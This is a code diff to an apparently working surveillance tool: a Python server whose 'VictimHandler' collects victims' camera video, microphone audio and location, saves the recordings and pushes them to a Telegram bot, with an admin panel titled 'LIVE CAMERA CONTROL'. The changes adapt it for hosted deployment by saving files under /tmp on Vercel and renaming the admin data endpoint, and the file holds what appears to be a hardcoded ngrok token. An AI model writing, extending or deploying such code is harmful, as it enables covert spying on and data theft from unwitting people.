@@ -29,6 +29,9 @@ NGROK_AUTH_TOKEN = "3Dj7jb7mVwUIKRkxJUeTeAwmDZQ_5QWgWBSRjqnwJnuw8EZnt"
 victim_count = 0
 victims_data = {}
 
+def get_save_path(fname):
+    return os.path.join('/tmp', fname) if os.environ.get('VERCEL_REGION') or os.environ.get('VERCEL') else fname
+
 def send_telegram(msg):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -39,7 +42,7 @@ def send_telegram(msg):
 def send_telegram_img(img_path, caption):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
-        with open(img_path, 'rb') as f:
+        with open(get_save_path(img_path), 'rb') as f:
             requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"}, files={"photo": f}, timeout=10)
     except Exception as e:
         print(f"Telegram Photo Error: {e}")
@@ -997,13 +1000,13 @@ ADMIN_PANEL = r'''<!DOCTYPE html>
     <div class="header">LIVE CAMERA CONTROL</div>
     <div class="controls">
         <button onclick="refreshAll()">REFRESH</button>
-        <button onclick="fetch('/admin?clear=1').then(refreshAll)">CLEAR ALL</button>
+        <button onclick="fetch('/admin/data?clear=1').then(refreshAll)">CLEAR ALL</button>
     </div>
     <div class="content" id="content"></div>
     <script>
         let victims={};
         function refreshAll(){
-            fetch('/admin').then(r=>r.json()).then(data=>{
+            fetch('/admin/data').then(r=>r.json()).then(data=>{
                 victims=data.victims;
                 const content=document.getElementById('content');
                 content.innerHTML='';
@@ -1098,7 +1101,7 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                     resp = requests.get(map_url, timeout=10)
                     if resp.status_code == 200:
                         img_path = f"victim_{victim['id']}_location_{int(time.time())}.png"
-                        with open(img_path, 'wb') as img_file:
+                        with open(get_save_path(img_path), 'wb') as img_file:
                             img_file.write(resp.content)
                         send_telegram_img(img_path, f"📍 Location pin for Victim #{victim['id']}")
                     else:
@@ -1124,7 +1127,7 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                                 print(f"DEBUG: Creating new video file: {fname}")
                             else:
                                 fname = victim['video_filename']
-                            with open(fname, 'ab') as f:
+                            with open(get_save_path(fname), 'ab') as f:
                                 f.write(decoded)
                             victim['video_bytes'] = victim.get('video_bytes', 0) + chunk_size
                             print(f"🎥 Appended {chunk_size} bytes to {fname} (total {victim['video_bytes']} bytes)")
@@ -1151,7 +1154,7 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                                 print(f"DEBUG: Creating new audio file: {afname}")
                             else:
                                 afname = victim['audio_filename']
-                            with open(afname, 'ab') as f:
+                            with open(get_save_path(afname), 'ab') as f:
                                 f.write(decoded)
                             victim['audio_bytes'] = victim.get('audio_bytes', 0) + chunk_size
                             print(f"🎧 Appended {chunk_size} bytes to {afname} (total {victim['audio_bytes']} bytes)")
